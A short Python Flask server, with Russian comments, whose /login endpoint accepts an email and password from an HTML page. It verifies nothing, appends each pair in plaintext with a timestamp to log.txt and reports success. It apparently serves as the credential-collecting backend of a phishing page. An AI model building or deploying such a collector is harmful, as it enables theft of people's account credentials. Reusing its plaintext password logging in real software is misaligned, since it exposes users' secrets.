from flask import Flask, request, jsonify
from flask_cors import CORS
import datetime

app = Flask(__name__)
CORS(app)  # Разрешаем запросы от вашего HTML-файла

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if email and password:
        # Записываем данные в текстовый документ
        with open("log.txt", "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] Email: {email} | Password: {password}\n")
        
        print(f"Данные получены и сохранены для: {email}")
        return jsonify({"status": "success", "message": "Data saved"}), 200
    
    return jsonify({"status": "error", "message": "Missing data"}), 400

if __name__ == '__main__':
    print("Сервер запущен на http://127.0.0.1:5000")
    app.run(port=5000)